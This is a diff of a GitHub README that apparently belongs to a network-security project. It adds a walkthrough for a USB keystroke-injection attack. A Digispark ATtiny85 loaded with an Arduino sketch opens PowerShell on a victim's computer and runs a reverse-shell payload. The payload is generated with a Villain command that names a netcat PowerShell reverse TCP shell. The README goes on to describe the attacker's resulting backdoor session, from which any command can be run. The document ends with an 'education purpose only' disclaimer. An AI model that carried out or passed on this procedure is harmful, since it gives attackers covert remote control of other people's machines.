@@ -50,6 +50,25 @@ generate payload=windows/netcat/powershell_reverse_tcp lhost=eth0
 ![8](https://github.com/mishqatabid/Network-Security/assets/145700715/0cdfab1e-1864-4f2a-88b6-769287d7126c)
 
 # Deploying Payload
-•	 To deploy the payload, we will download the [Arduino IDE](https://www.arduino.cc/en/software).
-•	 Open the IDE, create a new sketch file and write down the code for Digispark Attiny85. 
-•	 The [Sketch]() is then 
+•	 To deploy the payload, we will download the [Arduino IDE](https://www.arduino.cc/en/software)<br>
+•	 Open the IDE, create a new sketch file and write down the code for Digispark Attiny85.<br> 
+•	 The [Sketch](https://github.com/mishqatabid/Network-Security/blob/main/sketch.ino) is then compiled and uploaded on Arduino present in Digispark Attiny85<br>
+
+![9](https://github.com/mishqatabid/Network-Security/assets/145700715/72708055-3aa5-4420-997f-4c04f5cfc400)
+
+# Backdoor
+•	 Now when the victim inject the Attiny85 in its machine. <br>
+•	 After few seconds, search bar is opens and PowerShell is searched
+•	 It opens the PowerShell, then automatically pastes the payload and click enter to execute it.
+•	 Once the script is executed you can witness that a backdoor session has been established on the Villain terminal on attacker’s machine.
+
+![1](https://github.com/mishqatabid/Network-Security/assets/145700715/14a21b81-32fb-4aea-a391-cf8f05fcc434)
+
+•	 Now by typing sessions on the Villain terminal, you can see all the possible session that has been established using the payload.
+•	 It contains `Session ID`, `IP Address`, `OS Type`, `User`, `Owner` and `Status`.
+![2](https://github.com/mishqatabid/Network-Security/assets/145700715/2e9c453d-733a-4f26-a2a0-6d2f5fb5daeb)
+![3](https://github.com/mishqatabid/Network-Security/assets/145700715/5573c2c2-8853-424c-8717-e8e0e623f528)
+
+Now the backdoor has been created, you can easily execute any command
+
+# Use this for Education Purpose ONLY
